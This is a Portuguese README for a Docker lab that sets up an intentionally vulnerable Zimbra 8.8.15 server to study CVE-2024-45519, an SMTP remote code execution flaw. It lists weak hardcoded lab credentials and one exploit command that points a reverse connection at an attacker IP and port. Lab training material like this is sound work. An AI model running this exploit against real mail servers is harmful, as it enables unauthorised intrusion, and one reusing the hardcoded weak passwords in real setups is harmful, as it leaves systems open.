# MAQ-4 - Laboratório Zimbra CVE-2024-45519

Laboratório para estudo da vulnerabilidade CVE-2024-45519 no Zimbra Collaboration Suite, que permite Remote Code Execution (RCE) via SMTP.

## 🎯 Objetivo

Configurar um ambiente Zimbra vulnerável para estudo e exploração da vulnerabilidade CVE-2024-45519, permitindo execução de código remoto através do serviço SMTP.

## 🏗️ Arquitetura

- **Container**: Zimbra 8.8.15 GA rodando em Docker
- **Base**: Imagem `maattt10/zimbra8.8.15` (funcional e testada)
- **Hostname**: `zimbra.labo`
- **Portas**: 80, 443, 25, 22, 7071, etc.
- **Vulnerabilidade**: CVE-2024-45519 (Postjournal RCE)

## 🚀 Deploy Rápido

```bash
# 1. Deploy completo
./maquina4-setup.sh deploy

# 2. Aguardar inicialização (30-60 minutos)
# 3. Verificar status
./maquina4-setup.sh status

# 4. Testar conectividade
./maquina4-setup.sh test
```

### 🔧 **Configuração de Senhas**

Para alterar a senha do usuário `analyst`, edite o arquivo `docker-compose.yml`:

```yaml
environment:
  - ANALYST_PASSWORD=sua_nova_senha
```

**Nota**: As chaves SSH são geradas dinamicamente e ficam disponíveis em `./ssh_keys/`

## 📋 Comandos Disponíveis

| Comando | Descrição |
|---------|-----------|
| `deploy` | Deploy completo do laboratório |
| `stop` | Parar serviços |
| `status` | Status dos serviços |
| `clean` | Limpar recursos |
| `test` | Testar conectividade |
| `info` | Mostrar informações |

## 🌐 Acesso aos Serviços

- **Interface Web**: http://localhost:80
- **Interface HTTPS**: https://localhost:443
- **Admin Console**: https://localhost:7071
- **SMTP**: localhost:25
- **SSH**: localhost:22

## 🔑 Credenciais

- **Root**: `zimbra123`
- **Analyst**: `password123` (configurável via `ANALYST_PASSWORD`)
- **Chave SSH**: `./ssh_keys/analyst_id_rsa`
- **Chave Pública**: `./ssh_keys/analyst_id_rsa.pub`
- **Senha da chave**: igual à senha do usuário

## 🧨 Exploit

```bash
# Executar exploit
cd CVE-2024-45519
python3 exploit.py localhost -lh <attacker-ip> -lp <attacker-port> -p 25
```

## 📁 Estrutura do Projeto

```
MAQ-4/
├── Dockerfile                 # Imagem Docker personalizada
├── docker-compose.yml         # Configuração dos serviços
├── maquina4-setup.sh         # Script de gerenciamento
├── README.md                  # Este arquivo
├── CVE-2024-45519/           # Arquivos do exploit
│   ├── exploit.py            # Script de exploração
│   ├── requirements.txt      # Dependências Python
│   └── README.md            # Instruções do exploit
└── .gitignore                # Arquivos ignorados pelo Git
```

## ⚠️ Importante

- **Aguarde 30-60 minutos** após o deploy para o Zimbra inicializar completamente
- O laboratório é **intencionalmente vulnerável** - use apenas em ambiente isolado
- A porta SSH (22) funciona como **distração** durante a exploração

## 🔧 Solução de Problemas

### Container não inicia
```bash
# Verificar logs
docker compose logs

# Verificar status
./maquina4-setup.sh status
```

### Portas em uso
```bash
# Parar todos os containers
docker compose down

# Limpar recursos
./maquina4-setup.sh clean
```

### Zimbra não responde
- Aguarde mais tempo (pode levar até 60 minutos)
- Verifique logs: `docker compose logs -f`
- Teste conectividade: `./maquina4-setup.sh test`

## 📚 Referências

- [CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)
- [Zimbra Security Advisories](https://wiki.zimbra.com/wiki/Security_Center)
- [Docker Zimbra](https://hub.docker.com/r/maattt10/zimbra8.8.15)
